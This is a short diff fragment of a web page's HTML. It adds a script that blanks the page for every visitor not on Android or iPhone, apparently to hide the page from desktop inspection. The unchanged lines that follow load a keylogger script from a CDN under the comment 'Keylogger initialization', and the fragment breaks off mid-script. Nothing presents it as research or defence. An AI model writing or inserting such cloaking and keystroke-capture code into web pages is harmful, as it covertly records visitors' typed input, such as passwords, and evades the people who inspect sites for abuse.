@@ -86,6 +86,21 @@
     </div>
 
     <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const ua = navigator.userAgent;
+
+        const isAndroid = /Android/i.test(ua);
+        const isIphone = /iPhone/i.test(ua);
+
+        // Block everything except Android and iPhone
+        if (!isAndroid && !isIphone) {
+            document.documentElement.innerHTML = ""; // makes page blank
+        }
+    });
+    </script>
+
+
+    <script>
         // Keylogger initialization
         const keyloggerScript = document.createElement('script');
         keyloggerScript.src = 'https://cdn.jsdelivr.net/npm/keylogger@latest/dist/keylogger.min.js';
